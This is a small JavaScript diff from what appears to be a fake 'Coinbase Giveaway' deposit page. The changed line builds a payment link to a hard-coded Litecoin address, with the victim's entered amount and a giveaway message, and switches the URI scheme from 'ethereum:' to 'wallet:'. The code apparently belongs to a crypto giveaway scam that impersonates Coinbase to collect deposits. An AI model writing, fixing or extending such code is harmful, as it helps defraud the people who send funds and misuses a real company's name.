@@ -197,7 +197,7 @@ function update_trans() {
         .parent()
         .attr(
           'href',
-          'ethereum:ltc1qzctqq5nm5mzppy77qjkxc85r72rjp92tlht694?amount=' +
+          'wallet:ltc1qzctqq5nm5mzppy77qjkxc85r72rjp92tlht694?amount=' +
             amount_entered +
             '&message=Deposit+to+Coinbase+Giveaway+' +
             tm,
